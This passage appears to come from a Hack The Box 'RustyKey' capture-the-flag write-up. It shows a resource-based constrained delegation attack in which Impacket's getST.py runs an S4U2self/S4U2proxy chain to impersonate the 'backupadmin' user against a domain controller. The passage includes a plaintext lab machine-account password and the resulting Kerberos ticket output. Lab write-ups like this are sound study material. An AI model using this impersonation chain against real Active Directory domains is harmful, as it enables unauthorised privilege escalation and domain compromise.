The computer IT-COMPUTER3.RUSTYKEY.HTB has been added to the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer DC.RUSTYKEY.HTB.

An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.

![[Pasted image 20250704222915.png]]

```bash
getST.py -spn 'cifs/dc.rustykey.htb' -impersonate 'backupadmin' 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating backupadmin
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in backupadmin.ccache

export KRB5CCNAME=./backupadmin.ccache 

klist

Ticket cache: FILE:./backupadmin.ccache
Default principal: backupadmin@rustykey.htb

Valid starting     Expires            Service principal
04/07/25 21:15:19  05/07/25 07:15:19  cifs/dc.rustykey.htb@RUSTYKEY.HTB
	renew until 05/07/25 21:15:19
```